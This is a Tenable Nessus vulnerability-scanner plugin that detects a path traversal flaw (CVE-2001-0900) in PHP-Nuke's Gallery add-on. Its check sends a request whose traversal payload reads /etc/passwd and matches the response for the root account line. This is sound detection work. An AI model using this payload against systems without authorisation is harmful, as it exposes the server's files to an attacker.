#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10810);
 script_version("$Revision: 1.28 $");
 script_cvs_date("$Date: 2012/03/26 18:04:06 $");

 script_cve_id("CVE-2001-0900");
 script_bugtraq_id(3554); 
 script_osvdb_id(677);

 script_name(english:"PHP-Nuke Gallery Add-on modules.php include Parameter Traversal Arbitrary File Access");
 script_summary(english:"Determine if the remote host is affected by the gallery vulnerability");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote server.");
 script_set_attribute(attribute:"description", value:
"The remote PHP-Nuke service has a version of the 'Gallery' Add-on
that allow attackers to read arbitrary files on this host. 

Every file that the web server has access to can be read by anyone.");
 script_set_attribute(attribute:"solution", value:
"Disable this add-on.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value:"2001/11/25");
 script_set_attribute(attribute:"vuln_publication_date", value:"2001/11/19");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:phpnuke:php-nuke");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2001-2012 Tenable Network Security, Inc.");
 script_dependencie("php_nuke_installed.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

function check(data)
{
 local_var	r, buf;
 r = http_send_recv3(method:"GET", item:data, port:port);
 if (isnull(r)) exit(0);
 buf = strcat(r[0], r[1], '\r\n', r[2]);
 if (egrep(pattern:"root:.*:0:[01]:.*", string:buf))
    {
     security_warning(port);
     exit(0);
    }
}


installed = get_kb_item("www/" + port + "/php-nuke");
if ( ! installed ) exit(0);
array = eregmatch(pattern:"(.*) under (.*)", string:installed);
if ( ! array ) exit(0);
dir = array[2];

data = string(dir, "/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd");
check(data:data);
